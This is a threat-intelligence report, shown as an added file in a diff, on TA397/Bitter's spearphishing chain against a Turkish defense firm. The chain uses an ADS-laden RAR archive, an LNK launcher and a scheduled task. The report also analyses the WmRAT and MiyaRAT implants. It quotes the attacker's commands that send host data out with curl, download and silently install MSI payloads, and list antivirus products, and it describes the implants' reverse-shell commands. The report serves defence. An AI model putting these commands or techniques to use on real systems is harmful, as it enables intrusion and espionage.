@@ -1,0 +1,126 @@
+Hidden in Plain Sight: TA397’s New Attack Chain Delivers Espionage RATs
+Key findings 
+Proofpoint observed advanced persistent threat (APT) TA397 targeting a Turkish defense sector organization with a lure about public infrastructure projects in Madagascar. 
+The attack chain used alternate data streams in a RAR archive to deliver a shortcut (LNK) file that created a scheduled task on the target machine to pull down further payloads. 
+TA397 was observed manually delivering WmRAT and MiyaRAT malware families in the final stages of this attack chain. Both malware families are designed to enable intelligence gathering and exfiltration. 
+Proofpoint assesses TA397 campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests.
+Overview 
+On November 18, 2024, TA397 (also known by third-party researchers as Bitter) targeted a defense sector organization in Turkey with a spearphishing lure. The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code. 
+The lure contained the subject “PUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR” which closely matched the LNK file name masquerading as a PDF within the RAR archive: “PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk”. This subject line theme is very common for TA397, as the majority of the organizations they target are either in the public sector or receive public investments and is indicative of the targeted nature of their campaigns. 
+The usage of RAR archives is a staple tactic of TA397 payload delivery. Throughout the first half of 2024, Proofpoint has observed TA397 utilizing Microsoft Compiled Help Files (CHM) files within RAR archives as a means of creating scheduled tasks on target machines.
+This blog post details TA397’s usage of NTFS alternate data streams (ADS) in combination with PDF and LNK files to gain persistence, which facilitates the deployment of further malware. This research also looks at the continued usage of wmRAT by TA397, the recently discovered MiyaRAT - a contemporary addition to the threat actor’s arsenal – and the associated infrastructure of TA397.
+Infection chain 
+The spearphishing email originated from a compromised email account belonging to a government organization and contained a RAR archive with a variety of artifacts inside. Alongside the LNK file, was a “~tmp.pdf” file and two NTFS alternate data streams (ADS), one titled “Participation” and the other a “Zone.Identifier”.
+When opening the RAR file, the target would only see the LNK file as the ADS streams are hidden from the user when using Windows’ built in RAR extraction utility, or WinRAR. Further, the PDF had the attribute Hidden, System & Files ready for archiving (HSA) enabled so the user is lured to believe that a PDF file is being opened due to the extension pdf.lnk. By default, Windows hides the real extension of a file. However, if the RAR is opened in 7-Zip, the user can view and extract the NTFS ADS streams on Windows systems (NTFS file formatted system):
+ADS streams are a feature of the NTFS file system in Windows that allows users to attach data streams to a file. There are certain archive formats and software that allow ADS streams to be included into the archive container along with the file. The archive format used in this attack chain is RAR v5 which allows the storage of NTFS ADS streams.
+The Zone.Identifier stream is an ADS introduced in older Windows versions as a security feature. It stores information about the origin of a file, such as the URL Security Zone (e.g., Zone 3 for the internet) to determine if the file is trustworthy. Files downloaded via browsers automatically receive this stream. Additionally, when files are extracted from a downloaded archive using Windows Explorer, the extracted files inherit a Zone.Identifier stream with a ReferrerUrl pointing to the original archive. A Zone.Identifier ADS is very common and is not required for the success of this attack chain, nevertheless it can provide useful information for forensic analysis.
+The Zone.Identifier ADS contains information about the origin of the “~tmp.pdf” file.
+The “~tmp.pdf” file is a legitimate PDF downloaded from the World Bank organization, detailing an infrastructure project about paved roads in Madagascar.
+The second ADS is the “Participation” ADS. Inside the “Participation” stream was a base64 encoded PowerShell blob:
+The LNK ran the following conhost command:
+      --headless cmd /k "cmd < ~tmp.pdf:Participation & exit"
+This caused the ~tmp.pdf file to run the base64 encoded PowerShell contained within the “Participation” ADS stream which decoded to the following command:
+This PowerShell command opened the PDF lure file which displayed the World Bank decoy document to the user, and the command then set up a scheduled task named “DsSvcCleanup”. This scheduled task attempted to send target host information (username and computer name) with the curl utility every 17 minutes to the domain jacknwoods[.]com. This URI structure is used regularly by TA397. Upon successful retrieval of a payload, the downloaded file is launched with a command prompt. The task will continue to run even if a payload is dropped to the victim machine.
+These requests were structured as follows:
+GET hxxp[:]//jacknwoods[.]com/jacds[.]php?jin=%computername%_%username%
+Host: jacknwoods[.]com
+User-Agent: curl/7.55.1
+Accept: */*
+Proofpoint observed TA397 operators respond to these requests with manual commands approximately 12 hours after the first scheduled task request, deploying two distinct payloads and a third command that enumerated the target machine and issues a POST request containing that information. 
+First, we observed this response from the attacker server:
+This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”.
+TA397 issued further commands once they determined there was no successful communication from WmRAT. Shortly after, Proofpoint observed TA397 issuing the following commands to enumerate the target machine:
+cd C:\programdata 
+dir >> abc[.]pdf 
+tasklist >> abc[.]pdf 
+wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName >> abc[.]pdf 
+cmd /c curl -X POST -F "file=[@]C:\programdata\abc[.]pdf" 
+hxxps[:]//www[.]jacknwoods[.]com/chthuo[.]php?ain=%computername%_%username% 
+del abc[.]pdf
+This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain. A very similar set of commands was previously observed and attributed to TA397 and published by StrikeReady Labs.
+Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:
+curl -o C:\users\public\music\gfxview[.]msi 
+http://jacknwoods[.]com/gfxview[.]msi 
+msiexec /i C:\users\public\music\gfxview.msi /qn /norestart
+This acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload. WmRAT and MiyaRAT were first identified by QiAnXin Threat Intelligence Center. Below is Proofpoint’s detailed analysis of WmRAT and MiyaRAT.
+WmRAT
+WmRAT is a remote access trojan (RAT) written in C++ that uses sockets for communications and has standard RAT functionality. The RAT can gather basic host information, upload or download files, take screenshots, get geolocation data of the target machine, enumerate directories and files, and run arbitrary commands via cmd or PowerShell. The malware also generates a number of junk threads, potentially to mislead researchers or responders investigating the samples.
+The malware starts by copying timezone information from calling GetDynamicTimeZoneInformation. Rather than any unique or interesting sleep techniques, this malware uses the classic method of directly calling Sleep. This is done throughout the malware at various stages as well as having a dedicated function serving the purpose of just initiating a long sleep.
+The sample then creates a thread which gathers some basic host information:
+Username
+Hostname
+The list of logical drives for the host
+While this information is gathered, nothing is done with it and this process is repeated 1,000 times. Most likely this is just to fill up behavior logs or create copious amounts of noise within the environment.
+Soon after creating this thread, another thread is created that executes the same exact function gathering the same information.
+With the threads created, the malware begins attempts to communicate with the C2. In the samples observed by Proofpoint at this stage a socket has not been initialized yet, so these specific communications fail. Although later in the execution the socket is initialized properly, so it will indeed be able to communicate with the C2 after that point. The malware decrypts the C2 server address academymusica[.]com by taking each character from an encrypted blob and subtracting 0x25 from it.
+This subtraction cipher is how all string decryption is done for the malware. Each character has a set value added or subtracted from it, resulting in the expected output. Generally when malware sends command identifiers or data identifiers to the C2, its done in plaintext or is some numeric value. But in the case of this malware, it sends seemingly random values as identifiers.
+Assuming all the junk threads have started, the malware does a connectivity check by making a request to microsoft[.]com. After this, the socket is finally initialized to connect to the C2 decrypted earlier in the program. This is set to communicate with a hardcoded port, which in this sample is set to 47408.
+The socket receives a 4-byte value from the C2, swapping the endianness, and passing that to the command handler which indicates the ordinal value of the command to execute.
+As far as supported commands, these are some of the most notable ones:
+8: read and exfil file
+9: create host summary
+12: exit infection
+13: receive data from the C2, and write to file stream
+15: receive and decrypt filepath from C2,
+19: take screenshot and exfil
+21: get geolocation information
+22: get file listing from given directory and gather file create/modification time
+24: get disk size for files and directories
+26: mini command handler
+27: exec string in cmd or powershell, or restart self
+31: exit
+MiyaRAT
+MiyaRAT is also written in C++ and contains similar functionality to WmRAT. The malware starts by decrypting its hardcoded C2 server. This domain is decoded by taking the encoded value and subtracting the matching character in the string “doobiedoodooziezzz” from it.
+Doing this results in the C2 domain samsnewlooker[.]com. Along with this, the sample has as hardcoded port value set as a string which determines which port the implant connects to. Strangely the malware then runs its own implementation of Mersenne twister, which is a common random number generator implementation, which is used to generate values to sleep for a designated period of time.
+With the C2 decoded, a global socket is then created with the hardcoded port of 56189.
+After the socket is initialized, MiyaRAT gathers basic system information which is sent in the first communication to the C2.
+One of the final fields sent within the initial communication is the version of the malware, in this case being 3.
+This data is then encrypted by XORing each byte of the data with 0x43. An example of the entire set of data sent to the C2 can be seen below.
+C:\--3  [106.07/238.47] GB FREE
+|<username>|<hostname>|C:\Windows\cnstaller\MScCA69.tmp|C:\Users\<user>|10.0 125 19044|3.0|
+The C2 can respond commands that MiyaRAT supports:
+GDIR – get directory tree
+DELz – remove directory/file
+GFS – enumerate all files from a specific directory
+SH1start_cmd – reverse shell using CMD
+SH1start_ps – reverse shell using PowerShell
+SH1 – interact with reverse shell
+SFS – connect to new socket to upload and download files via UPL/DWNL
+GSS – take screenshot and exfil
+SH1exit_client – close infection
+SH2 - interact with reverse shell
+Network analysis
+TA397’s infrastructure usage throughout this campaign is divided between the implant domains and the staging domains. The jacknwoods[.]com domain acted as their staging domain to distribute WmRAT and MiyaRAT, and academymusica[.]com and samsnewlooker[.]com as C2 domains for each implant.
+The staging domain jacknwoods[.]com resolved to 185.244.151[.]84, registered with a Let’s Encrypt certificate with GoDaddy as a provider. Proofpoint has observed this combination of domain registration patterns in several previous TA397 campaigns when deploying staging infrastructure. The IP is multi-tenanted, and not controlled by TA397.
+The WmRAT C2 academymusica[.]com resolved to 38.180.142[.]228 at the time of analysis, while theMiyaRAT C2  samsnewlooker[.]comresolved to 96.9.215[.]155. Proofpoint assesses it is likely these two IPs are attacker-owned infrastructure.
+Attribution
+Whilst this blog has revealed an interesting evolution of TTPs in TA397’s capability set; this activity still demonstrates signature markers of behavior Proofpoint have observed from TA397 historically:
+The usage of RAR archives to deliver a payload that creates a scheduled task on target machines, with a command line structure that seldom changes.
+The infrastructure and hosting providers in use bears similarities to historical TA397 infrastructure.
+Targeting organizations in the defense sector in the EMEA and APAC regions.
+Across observed campaigns, activity consistently falls within the working hours of UTC+5:30. Proofpoint has observed the manual deployment of TA397 malware multiple times across different campaigns that align with the working hours of this timezone.
+Both RATs analyzed in this blog have been historically attributed to TA397 (wmRAT and MiyaRAT respectively), and Proofpoint concurs with this assessment.
+Proofpoint assesses WmRAT and MiyaRAT are two distinct malware families in active, operational use by TA397. We believe it is a realistic possibility that both families were written by the same developer(s). It is also clear that MiyaRAT is the newer of the two tools in their arsenal. Proofpoint assesses MiyaRAT may be reserved for targets TA397 deems high value due to the observed sporadic deployment of the malware in only a certain number of campaigns.
+Based on Proofpoint's analysis of the characteristics of the observed campaign, previously observed lure content, historical targeting, time-based analysis of TA397 campaigns, and a review of industry reporting on activity associated to Bitter, Proofpoint researchers assess these campaigns are almost certainly intelligence collection efforts in support of a South Asian government’s interests.
+TA397 is a prominent South-Asian nexus, espionage-focused APT that frequently and consistently targets government, energy, telecommunications, defense and engineering organizations throughout the EMEA and APAC regions. They persistently utilize scheduled tasks to communicate with their staging domains to deploy malicious backdoors into target organizations, for the purpose of gaining access to privileged information and intellectual property.
+YARA signature available here.
+2058192 - ET MALWARE TA397/Bitter Requesting Next Stage Payload
+IOCs
+Indicator  Type  First Observed  Description
+53a653aae9678075276bdb8ccf5e SHA256  2024-11-18  RAR
+aff947f9121f73b8dcf24858c04479
+22d0b1
+f6c77098906f5634789d7fd7ff294b SHA256  2024-11-18  LNK
+fd95325d69f1be96be1ee49ff161e07
+733
+10cec5a84943f9b0c635640fad93f SHA256  2024-09-23  wmRAT
+d2a2469cc46aae5e43a4604c903
+d139970f
+c7ab300df27ad41f8d9e52e2d732f SHA256  2024-10-12  MiyaRAT
+95479f4212a3c3d62dbf0511b37b3
+e81317
+academymusica[.]com  Domain  2024-11-06  C2
+samsnewlooker[.]com  Domain  2024-09-25  C2
+jacknwoods[.]com   Domain   2024-11-07  Staging Domain
+38.180.142[.]228  IP  2024-11-06  C2
+96.9.215[.]155  IP  2024-09-25  C2
